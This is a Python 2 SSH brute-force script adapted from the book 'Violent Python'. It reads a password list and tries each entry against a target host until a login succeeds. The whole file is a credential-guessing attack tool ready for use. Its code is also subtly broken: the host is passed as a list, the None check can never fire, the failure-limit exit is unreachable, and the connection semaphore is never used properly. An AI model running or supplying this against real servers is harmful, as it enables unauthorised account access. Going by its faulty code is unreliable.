#!/usr/bin/env python2
# written by Moses Arocha
# Written with the help of TJ O'Connor in his book "Violent Python"

import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
	global Found
	global Fails
	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print '[+] Password Found: ' + password
		Found = True
	except Exception, e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, False)
	finally:
		print '\n [Failure] Next Password Attempt'

def BruteForce(host, user, passwdFile):
	OpenFile = open(passwdFile, 'r')
	for line in OpenFile.readlines():
		password = line.split(':')[0].strip('\n')
		print "[-] Testing: "+str(password)
		connect(host, user, password, True)
		if Found:	
			print "[*] Exiting: Password Found"
			exit(0)
			if Fails > 5:
				print "[!] Exiting: Too Many Socket Timeout Attempts"
				exit(0)
	connection_lock.acquire()
	

def main():
	parser = optparse.OptionParser("Usages For Program -H <Target Host> -U <user> -F <Password List>")
	parser.add_option('-H', '--Host', dest='tgtHost', type='string', help='Specify Target Host')
	parser.add_option('-F','--File', dest='passwdFile', type='string', help='Specify The Password File')
	parser.add_option('-U', '--User', dest='user', type='string', help='Specify The User')
	(options, args) = parser.parse_args()
	host = str(options.tgtHost).split(',') # No space between inserting different hosts
	passwdFile = options.passwdFile
	user = options.user
	if host == None or passwdFile == None or user == None:
		print parser.usage
		exit(0)
	print "\n\t SSH Brute Force Passwords\n"
	print "  Attempting To Breach Credientals For: ", host
	BruteForce(host, user, passwdFile)	
	
	
if __name__ == '__main__':
	main()
